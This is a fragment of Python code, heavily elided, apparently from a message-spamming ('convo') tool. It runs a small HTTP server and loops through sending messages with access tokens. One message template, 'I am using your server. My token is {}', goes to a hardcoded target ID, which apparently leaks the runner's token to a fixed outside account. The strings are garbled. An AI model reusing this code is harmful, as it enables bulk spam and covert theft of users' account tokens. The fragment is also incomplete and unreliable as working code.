...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- ||SR||3L ||NS||D3")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "||SM|A|L JİJ9 Jİ! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100085406662475"
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+]   İSRAİL JİJA JI Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
